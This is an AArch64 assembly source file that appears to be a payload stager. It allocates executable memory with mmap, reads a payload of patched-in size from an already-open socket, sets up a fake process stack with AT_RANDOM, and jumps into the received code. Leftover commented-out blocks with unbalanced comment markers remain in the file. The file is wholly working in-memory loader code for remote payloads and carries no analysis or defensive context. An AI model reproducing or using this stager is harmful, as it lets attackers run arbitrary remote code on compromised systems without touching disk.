.equ SYS_READ, 0x3f
.equ SYS_MMAP, 0xde
.equ SYS_EXIT, 0x5d

.equ SIZE, 0xeeeeeeee
.equ ENTRY, 0xffffffff

start:
    adr    x2, size
    ldr    w2, [x2]
    mov    x10, x2

    /* Page-align, assume <4GB */
    lsr    x2, x2, #12
    add    x2, x2, #1
    lsl    x2, x2, #12

    /* mmap(addr=0, length='x2', prot=7, flags=34, fd=0, offset=0) */
    mov    x0, xzr
    mov    x1, x2
    mov    x2, #7
    mov    x3, #34
    mov    x4, xzr
    mov    x5, xzr
    mov    x8, SYS_MMAP
    svc    0

    /* Grab the saved size, save the address */
    mov    x4, x10

    /* Save the memory address */
    mov    x3, x0
    mov    x10, x0

read_loop:
    /* read(sockfd, buf='x3', nbytes='x4') */
    mov    x0, x12
    mov    x1, x3
    mov    x2, x4
    mov    x8, SYS_READ
    svc    0
    cbz    w0, failed
    add    x3, x3, x0
    subs   x4, x4, x0
    bne    read_loop

    /* set up the initial stack */
    /*

    add    sp, sp, #80
    mov    x4, #109
    eor    x5, x5, x5
    stp    x4, x5, [sp, #-16]!

    mov x1,#2   
    mov x2,sp   
    mov x3,#0   

    mov x4,#2   
    mov x5,sp   
    mov x6,x12  
    mov x7,#0   
    mov x8,#0   
    mov x9,#7   
    mov x10,x10 
    mov x11,#0  
    mov x12,#0

    eor x0, x0, x0
    eor x1, x1, x1
    eor x2, x2, x2
    eor x3, x3, x3
    stp    x4, x5, [sp, #-16]!
    stp    x6, x7, [sp, #-16]!
    stp    x7, x8, [sp, #-16]!
    stp    x9, x10, [sp, #-16]!
    stp    x11, x12, [sp, #-16]!
    */

    adr    x0, entry
    ldr    x0, [x0]
    // entry_offset + mmap
    add    x0, x0, x10

    mov    x8, x0


    /* Set up the fake stack.
       For whatever reason, aarch64 binaries really want AT_RANDOM
       to be available. */
    /* AT_NULL */
    eor x0, x0, x0
    eor x1, x1, x1
    stp  x0, x1, [sp, #-16]!
    /* AT_RANDOM */
    mov x2, #25
    mov x3, sp
    stp  x2, x3, [sp, #-16]!

    /* argc, argv[0], argv[1], envp */
    /* ideally these could all be empty, but unfortunately
       we have to keep the stack aligned.  it's easier to
       just push an extra argument than care... */
    stp  x0, x1, [sp, #-16]! /* argv[1] = NULL, envp = NULL */
    mov  x0, 1
    mov  x1, sp
    stp  x0, x1, [sp, #-16]! /* argc = 1, argv[0] = "" */

    br x8

    /*
    mov    x0, #109
    mov    x1, x12
    stp  x0, x1, [sp, #-16]! /* argv[1] = NULL, envp = NULL */
   /* mov  x0, 2
    mov  x1, sp
    stp  x0, x1, [sp, #-16]! /* argc = 1, argv[0] = "" */

    /*
    blr    x8
    */

failed:
    mov    x0, 0
    mov    x8, SYS_EXIT
    svc    0

.balign 16
size:
        .word SIZE
        .word 0
entry:
        .word ENTRY
        .word 0
m:
.word 0x0000006d
.word 0x00000000
